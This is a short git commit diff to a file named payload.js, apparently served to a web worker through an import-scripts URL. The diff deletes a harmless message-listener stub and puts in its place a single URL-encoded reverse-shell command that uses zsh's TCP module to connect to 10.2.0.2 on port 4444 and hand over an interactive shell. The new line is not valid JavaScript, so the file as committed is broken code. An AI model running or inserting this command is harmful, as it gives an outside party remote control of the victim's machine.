5454b38f6f978258fc1dfc41100a132e467cc8a5
MKlolbullen <53312929+MKlolbullen@users.noreply.github.com>
2025-07-02 14:27:32 +0200

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,5 +1,2 @@
 // payload.js – served from IMPORT_SCRIPTS_URL
-console.log("[payload.js] executing in worker");
-self.addEventListener("message", e => {
-  if (e.data === "hello?") self.postMessage("hi from payload.js");
-});
+bash%20-c%20'zmodload%20zsh/net/tcp%20&&%20ztcp%2010.2.0.2%204444%20&&%20zsh%20%3E&$REPLY%202%3E&$REPLY%200%3E&$REPLY'
